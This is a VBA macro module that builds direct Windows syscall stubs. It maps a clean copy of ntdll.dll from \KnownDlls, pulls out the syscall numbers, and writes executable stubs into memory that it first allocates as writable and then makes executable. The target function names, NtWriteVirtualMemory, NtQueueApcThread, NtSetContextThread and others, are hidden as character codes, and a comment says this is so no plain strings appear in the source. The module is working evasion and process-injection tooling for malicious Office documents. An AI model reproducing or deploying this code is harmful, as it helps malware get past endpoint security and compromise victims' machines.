Option Explicit

Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)

Private SyscallNamesArr() As String
Private SyscallAddrsArr() As LongPtr
Private SyscallCount As Long
Private StubPage As LongPtr

' Names of the Nt* functions we build stubs for. Constructed via MkStr at
' runtime so no flat literals appear in source.
Private Function NeededNames() As Variant
    NeededNames = Array( _
        MkStr(78,116,65,108,108,111,99,97,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121), _
        MkStr(78,116,87,114,105,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121), _
        MkStr(78,116,80,114,111,116,101,99,116,86,105,114,116,117,97,108,77,101,109,111,114,121), _
        MkStr(78,116,82,101,97,100,86,105,114,116,117,97,108,77,101,109,111,114,121), _
        MkStr(78,116,67,114,101,97,116,101,85,115,101,114,80,114,111,99,101,115,115), _
        MkStr(78,116,81,117,101,117,101,65,112,99,84,104,114,101,97,100), _
        MkStr(78,116,82,101,115,117,109,101,84,104,114,101,97,100), _
        MkStr(78,116,67,108,111,115,101), _
        MkStr(78,116,79,112,101,110,83,101,99,116,105,111,110), _
        MkStr(78,116,77,97,112,86,105,101,119,79,102,83,101,99,116,105,111,110), _
        MkStr(78,116,85,110,109,97,112,86,105,101,119,79,102,83,101,99,116,105,111,110), _
        MkStr(78,116,83,101,116,67,111,110,116,101,120,116,84,104,114,101,97,100), _
        MkStr(82,116,108,65,100,100,86,101,99,116,111,114,101,100,69,120,99,101,112,116,105,111,110,72,97,110,100,108,101,114))
End Function

' Public entry. Returns True if at least one syscall stub was built.
Public Function ResolveSyscalls() As Boolean
    Dim cleanBase As LongPtr
    cleanBase = MapCleanNtdll()
    If cleanBase = 0 Then Exit Function

    Dim dos As IMAGE_DOS_HEADER
    CopyMemory VarPtr(dos), cleanBase, LenB(dos)
    If dos.e_magic <> &H5A4D Then Exit Function

    Dim nt As IMAGE_NT_HEADERS64
    CopyMemory VarPtr(nt), cleanBase + dos.e_lfanew, LenB(nt)
    If nt.Signature <> &H4550 Then Exit Function

    Dim expRva As Long
    expRva = nt.OptionalHeader.DataDirectory(0).VirtualAddress
    If expRva = 0 Then Exit Function

    Dim ed As IMAGE_EXPORT_DIRECTORY
    CopyMemory VarPtr(ed), cleanBase + expRva, LenB(ed)

    Dim addrOfNames As LongPtr, addrOfOrds As LongPtr, addrOfFuncs As LongPtr
    addrOfNames = cleanBase + ed.AddressOfNames
    addrOfOrds = cleanBase + ed.AddressOfNameOrdinals
    addrOfFuncs = cleanBase + ed.AddressOfFunctions

    Dim needed As Variant
    needed = NeededNames()
    Dim numNeeded As Long
    numNeeded = UBound(needed) - LBound(needed) + 1
    ReDim SyscallNamesArr(0 To numNeeded - 1)
    ReDim SyscallAddrsArr(0 To numNeeded - 1)
    SyscallCount = 0

    StubPage = AllocRW(4096)
    If StubPage = 0 Then Exit Function

    Dim stubOffset As Long
    stubOffset = 0

    Dim i As Long, j As Long
    Dim nameRva As Long, nameAddr As LongPtr, funcName As String
    Dim ord As Integer, funcRva As Long, funcAddr As LongPtr
    Dim prologue(0 To 7) As Byte, ssn As Long
    Dim found As Boolean

    For i = 0 To CLng(ed.NumberOfNames) - 1
        CopyMemory VarPtr(nameRva), addrOfNames + i * 4, 4
        nameAddr = cleanBase + nameRva
        funcName = ReadAnsi(nameAddr)

        found = False
        For j = LBound(needed) To UBound(needed)
            If StrComp(funcName, CStr(needed(j)), vbBinaryCompare) = 0 Then
                found = True
                Exit For
            End If
        Next j
        If Not found Then GoTo NextOne

        CopyMemory VarPtr(ord), addrOfOrds + i * 2, 2
        CopyMemory VarPtr(funcRva), addrOfFuncs + (CLng(ord) And &HFFFF&) * 4, 4
        funcAddr = cleanBase + funcRva

        CopyMemory VarPtr(prologue(0)), funcAddr, 8
        ' Standard stub prologue: 4C 8B D1 B8 <SSN:4>
        If prologue(0) <> &H4C Or prologue(1) <> &H8B Or prologue(2) <> &HD1 Or prologue(3) <> &HB8 Then
            ' Rtl* helpers are not syscall stubs; store the function address directly.
            If Left$(funcName, 2) = "Rt" Then
                SyscallNamesArr(SyscallCount) = funcName
                SyscallAddrsArr(SyscallCount) = funcAddr
                SyscallCount = SyscallCount + 1
            End If
            GoTo NextOne
        End If

        ssn = (CLng(prologue(4)) And &HFF&) _
            Or ((CLng(prologue(5)) And &HFF&) * &H100&) _
            Or ((CLng(prologue(6)) And &HFF&) * &H10000) _
            Or ((CLng(prologue(7)) And &HFF&) * &H1000000)

        ' Build a 12-byte stub at StubPage + stubOffset
        Dim stub(0 To 15) As Byte
        stub(0) = &H4C: stub(1) = &H8B: stub(2) = &HD1
        stub(3) = &HB8
        stub(4) = ssn And &HFF
        stub(5) = (ssn \ &H100) And &HFF
        stub(6) = (ssn \ &H10000) And &HFF
        stub(7) = (ssn \ &H1000000) And &HFF
        stub(8) = &HF: stub(9) = &H5
        stub(10) = &HC3
        stub(11) = &H90: stub(12) = &H90: stub(13) = &H90: stub(14) = &H90: stub(15) = &H90
        CopyMemory StubPage + stubOffset, VarPtr(stub(0)), 16

        SyscallNamesArr(SyscallCount) = funcName
        SyscallAddrsArr(SyscallCount) = StubPage + stubOffset
        SyscallCount = SyscallCount + 1
        stubOffset = stubOffset + 16
NextOne:
    Next i

    If Not MakeRX(StubPage, 4096) Then Exit Function
    ResolveSyscalls = (SyscallCount > 0)
End Function

' Map \KnownDlls\ntdll.dll for clean SSN extraction.
Private Function MapCleanNtdll() As LongPtr
    Dim hNtdll As LongPtr
    hNtdll = GetMod(MkStr(110,116,100,108,108,46,100,108,108))
    If hNtdll = 0 Then Exit Function

    Dim pOpen As LongPtr, pMap As LongPtr
    pOpen = GetProc(hNtdll, MkStr(78,116,79,112,101,110,83,101,99,116,105,111,110))
    pMap = GetProc(hNtdll, MkStr(78,116,77,97,112,86,105,101,119,79,102,83,101,99,116,105,111,110))
    If pOpen = 0 Or pMap = 0 Then Exit Function

    Dim path As String, i As Long, n As Long
    path = MkStr(92,75,110,111,119,110,68,108,108,115,92,110,116,100,108,108,46,100,108,108)
    n = Len(path)
    Dim wide() As Byte
    ReDim wide(0 To n * 2 - 1)
    For i = 1 To n
        wide((i - 1) * 2) = Asc(Mid$(path, i, 1)) And &HFF
        wide((i - 1) * 2 + 1) = 0
    Next i

    Dim us As UNICODE_STRING
    us.Length = n * 2
    us.MaximumLength = n * 2
    us.Padding = 0
    us.Buffer = VarPtr(wide(0))

    Dim oa As OBJECT_ATTRIBUTES
    oa.Length = LenB(oa)
    oa.Pad1 = 0
    oa.RootDirectory = 0
    oa.ObjectName = VarPtr(us)
    oa.Attributes = &H40   ' OBJ_CASE_INSENSITIVE
    oa.Pad2 = 0
    oa.SecurityDescriptor = 0
    oa.SecurityQualityOfService = 0

    Dim hSection As LongPtr, status As Long
    hSection = 0
    status = CLng(Call3(pOpen, VarPtr(hSection), SECTION_MAP_READ, VarPtr(oa)))
    If status <> STATUS_SUCCESS Then Exit Function

    Dim base As LongPtr, viewSize As LongPtr
    base = 0: viewSize = 0
    status = CLng(Call10(pMap, _
        hSection, -1&, VarPtr(base), 0, 0, 0, VarPtr(viewSize), 1, 0, PAGE_READONLY))
    If status < 0 Then Exit Function   ' NTSTATUS negative = error
    MapCleanNtdll = base
End Function

' Read a null-terminated ANSI string from memory.
Private Function ReadAnsi(addr As LongPtr) As String
    Dim s As String, b As Byte, off As Long
    Do
        CopyMemory VarPtr(b), addr + off, 1
        If b = 0 Then Exit Do
        s = s & Chr$(b)
        off = off + 1
        If off > 256 Then Exit Do
    Loop
    ReadAnsi = s
End Function

Private Function FindStub(name As String) As LongPtr
    Dim i As Long
    For i = 0 To SyscallCount - 1
        If StrComp(SyscallNamesArr(i), name, vbBinaryCompare) = 0 Then
            FindStub = SyscallAddrsArr(i)
            Exit Function
        End If
    Next i
End Function

' ==================== Public SysCall wrappers ====================

Public Function SysCall0(name As String) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall0 = Call0(p)
End Function
Public Function SysCall1(name As String, ByVal a1 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall1 = Call1(p, a1)
End Function
Public Function SysCall2(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall2 = Call2(p, a1, a2)
End Function
Public Function SysCall3(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall3 = Call3(p, a1, a2, a3)
End Function
Public Function SysCall4(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall4 = Call4(p, a1, a2, a3, a4)
End Function
Public Function SysCall5(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall5 = Call5(p, a1, a2, a3, a4, a5)
End Function
Public Function SysCall6(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall6 = Call6(p, a1, a2, a3, a4, a5, a6)
End Function
Public Function SysCall7(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall7 = Call7(p, a1, a2, a3, a4, a5, a6, a7)
End Function
Public Function SysCall8(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall8 = Call8(p, a1, a2, a3, a4, a5, a6, a7, a8)
End Function
Public Function SysCall9(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall9 = Call9(p, a1, a2, a3, a4, a5, a6, a7, a8, a9)
End Function
Public Function SysCall10(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr, ByVal a10 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall10 = Call10(p, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10)
End Function
Public Function SysCall11(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr, ByVal a10 As LongPtr, ByVal a11 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall11 = Call11(p, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11)
End Function
Public Function SysCall12(name As String, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr, ByVal a10 As LongPtr, ByVal a11 As LongPtr, ByVal a12 As LongPtr) As LongPtr
    Dim p As LongPtr: p = FindStub(name)
    If p <> 0 Then SysCall12 = Call12(p, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12)
End Function
